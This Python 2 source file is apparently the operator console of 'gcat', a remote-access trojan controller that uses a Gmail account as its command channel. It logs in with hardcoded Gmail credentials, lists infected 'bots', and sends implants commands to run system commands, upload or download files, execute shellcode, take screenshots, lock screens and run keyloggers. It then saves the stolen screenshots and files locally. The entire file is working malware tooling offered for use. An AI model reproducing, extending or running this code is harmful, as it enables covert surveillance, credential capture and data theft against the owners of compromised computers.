import argparse
import email
import imaplib
import sys
import uuid
import string
import ast
import os
import json
import random

from datetime import datetime
from base64 import b64decode
from smtplib import SMTP
from argparse import RawTextHelpFormatter
from email.MIMEMultipart import MIMEMultipart
from email.MIMEBase import MIMEBase
from email.MIMEText import MIMEText
from email import Encoders

#######################################
gmail_user = 'gcat.is.the.shit@gmail.com'
gmail_pwd = 'veryc00lp@ssw0rd'
server = "smtp.gmail.com"
server_port = 587
#######################################

def genJobID(slen=7):
    return ''.join(random.sample(string.ascii_letters + string.digits, slen))

class msgparser:

    def __init__(self, msg_data):
        self.attachment = None
        self.getPayloads(msg_data)
        self.getSubjectHeader(msg_data)
        self.getDateHeader(msg_data)

    def getPayloads(self, msg_data):
        for payload in email.message_from_string(msg_data[1][0][1]).get_payload():
            if payload.get_content_maintype() == 'text':
                self.text = payload.get_payload()
                self.dict = json.loads(payload.get_payload())

            elif payload.get_content_maintype() == 'application':
                self.attachment = payload.get_payload()

    def getSubjectHeader(self, msg_data):
        self.subject = email.message_from_string(msg_data[1][0][1])['Subject']

    def getDateHeader(self, msg_data):
        self.date = email.message_from_string(msg_data[1][0][1])['Date']

class Gcat:

    def __init__(self):
        self.c = imaplib.IMAP4_SSL(server)
        self.c.login(gmail_user, gmail_pwd)

    def sendEmail(self, botid, jobid, cmd, arg='', attachment=[]):

        if (botid is None) or (jobid is None):
            sys.exit("[-] You must specify a client id (-id) and a jobid (-job-id)")
        
        sub_header = 'gcat:{}:{}'.format(botid, jobid)

        msg = MIMEMultipart()
        msg['From'] = sub_header
        msg['To'] = gmail_user
        msg['Subject'] = sub_header
        msgtext = json.dumps({'cmd': cmd, 'arg': arg})
        msg.attach(MIMEText(str(msgtext)))
        
        for attach in attachment:
            if os.path.exists(attach) == True:  
                part = MIMEBase('application', 'octet-stream')
                part.set_payload(open(attach, 'rb').read())
                Encoders.encode_base64(part)
                part.add_header('Content-Disposition', 'attachment; filename="{}"'.format(os.path.basename(attach)))
                msg.attach(part)

        mailServer = SMTP()
        mailServer.connect(server, server_port)
        mailServer.starttls()
        mailServer.login(gmail_user,gmail_pwd)
        mailServer.sendmail(gmail_user, gmail_user, msg.as_string())
        mailServer.quit()

        print "[*] Command sent successfully with jobid: {}".format(jobid)


    def checkBots(self):
        bots = []
        self.c.select(readonly=1)
        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'checkin:')")

        for idn in idlist[0].split():
            msg_data = self.c.uid('fetch', idn, '(RFC822)')
            msg = msgparser(msg_data)
            
            try:
                botid = str(uuid.UUID(msg.subject.split(':')[1]))
                if botid not in bots:
                    bots.append(botid)
                    
                    print botid, msg.dict['sys']
            
            except ValueError:
                pass

    def getBotInfo(self, botid):

        if botid is None:
            sys.exit("[-] You must specify a client id (-id)")

        self.c.select(readonly=1)
        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'checkin:{}')".format(botid))

        for idn in idlist[0].split():
            msg_data = self.c.uid('fetch', idn, '(RFC822)')
            msg = msgparser(msg_data)

            print "ID: " + botid
            print "DATE: '{}'".format(msg.date)
            print "OS: " + msg.dict['sys']
            print "ADMIN: " + str(msg.dict['admin']) 
            print "FG WINDOWS: '{}'\n".format(msg.dict['fgwindow'])

    def getJobResults(self, botid, jobid):

        if (botid is None) or (jobid is None):
            sys.exit("[-] You must specify a client id (-id) and a jobid (-job-id)")

        self.c.select(readonly=1)
        rcode, idlist = self.c.uid('search', None, "(SUBJECT 'imp:{}:{}')".format(botid, jobid))

        for idn in idlist[0].split():
            msg_data = self.c.uid('fetch', idn, '(RFC822)')
            msg = msgparser(msg_data)

            print "DATE: '{}'".format(msg.date)
            print "JOBID: " + jobid
            print "FG WINDOWS: '{}'".format(msg.dict['fgwindow'])
            print "CMD: '{}'".format(msg.dict['msg']['cmd'])
            print ''
            print msg.dict['msg']['res'] + '\n'

            if msg.attachment:

                if msg.dict['msg']['cmd'] == 'screenshot':
                    imgname = '{}-{}.png'.format(botid, jobid)
                    with open("./data/" + imgname, 'wb') as image:
                        image.write(b64decode(msg.attachment))
                        image.close()

                    print "[*] Screenshot saved to ./data/" + imgname

                elif msg.dict['msg']['cmd'] == 'download':
                    filename = "{}-{}".format(botid, jobid)
                    with open("./data/" + filename, 'wb') as dfile:
                        dfile.write(b64decode(msg.attachment))
                        dfile.close()

                    print "[*] Downloaded file saved to ./data/" + filename

    def logout():
        self.c.logout()


if __name__ == '__main__':

    parser = argparse.ArgumentParser(description="""
                                             dP   
                                             88   
                .d8888b. .d8888b. .d8888b. d8888P 
                88'  `88 88'  `"" 88'  `88   88   
                88.  .88 88.  ... 88.  .88   88   
                `8888P88 `88888P' `88888P8   dP   
                     .88                          
                 d8888P  
                     

                   .__....._             _.....__,
                     .": o :':         ;': o :".
                     `. `-' .'.       .'. `-' .'   
                       `---'             `---'  

             _...----...      ...   ...      ...----..._
          .-'__..-''----    `.  `"`  .'    ----'''-..__`-.
         '.-'   _.--'''       `-._.-'       ''''--._   `-.`
         '  .-"'                  :                  `"-.  `
           '   `.              _.'"'._              .'   `
                 `.       ,.-'"       "'-.,       .'
                   `.                           .'
              jgs    `-._                   _.-'
                         `"'--...___...--'"`

                     ...IM IN YUR COMPUTERZ...

                        WATCHIN YUR SCREENZ
""",                                 
                                     version='1.0.0',
                                     formatter_class=RawTextHelpFormatter,
                                     epilog='Meow!')

    parser.add_argument("-id", dest='id', type=str, default=None, help="Client to target")
    parser.add_argument('-jobid', dest='jobid', default=None, type=str, help='Job id to retrieve')
    
    agroup = parser.add_argument_group()
    blogopts = agroup.add_mutually_exclusive_group()
    blogopts.add_argument("-list", dest="list", action="store_true", help="List available clients")
    blogopts.add_argument("-info", dest='info', action='store_true', help='Retrieve info on specified client')

    sgroup = parser.add_argument_group("Commands", "Commands to execute on an implant")
    slogopts = sgroup.add_mutually_exclusive_group()
    slogopts.add_argument("-cmd", metavar='CMD', dest='cmd', type=str, help='Execute a system command')
    slogopts.add_argument("-download", metavar='PATH', dest='download', type=str, help='Download a file from a clients system')
    slogopts.add_argument("-upload", nargs=2, metavar=('SRC', 'DST'), help="Upload a file to the clients system")
    slogopts.add_argument("-exec-shellcode", metavar='FILE',type=argparse.FileType('rb'), dest='shellcode', help='Execute supplied shellcode on a client')
    slogopts.add_argument("-screenshot", dest='screen', action='store_true', help='Take a screenshot')
    slogopts.add_argument("-lock-screen", dest='lockscreen', action='store_true', help='Lock the clients screen')
    slogopts.add_argument("-force-checkin", dest='forcecheckin', action='store_true', help='Force a check in')
    slogopts.add_argument("-start-keylogger", dest='keylogger', action='store_true', help='Start keylogger')
    slogopts.add_argument("-stop-keylogger", dest='stopkeylogger', action='store_true', help='Stop keylogger')
    
    if len(sys.argv) is 1:
        parser.print_help()
        sys.exit()

    args = parser.parse_args()
    
    gcat = Gcat()
    jobid = genJobID()

    if args.list:
        gcat.checkBots()

    elif args.info:
        gcat.getBotInfo(args.id)

    elif args.cmd:
        gcat.sendEmail(args.id, jobid, 'cmd', args.cmd)

    elif args.shellcode:
        gcat.sendEmail(args.id, jobid, 'execshellcode', args.shellcode.read().strip())

    elif args.download:
        gcat.sendEmail(args.id, jobid, 'download', r'{}'.format(args.download))

    elif args.upload:
        gcat.sendEmail(args.id, jobid, 'upload', r'{}'.format(args.upload[1]), [args.upload[0]])

    elif args.screen:
        gcat.sendEmail(args.id, jobid, 'screenshot')

    elif args.lockscreen:
        gcat.sendEmail(args.id, jobid, 'lockscreen')

    elif args.forcecheckin:
        gcat.sendEmail(args.id, jobid, 'forcecheckin')

    elif args.keylogger:
        gcat.sendEmail(args.id, jobid, 'startkeylogger')

    elif args.stopkeylogger:
        gcat.sendEmail(args.id, jobid, 'stopkeylogger')

    elif args.jobid:
        gcat.getJobResults(args.id, args.jobid)
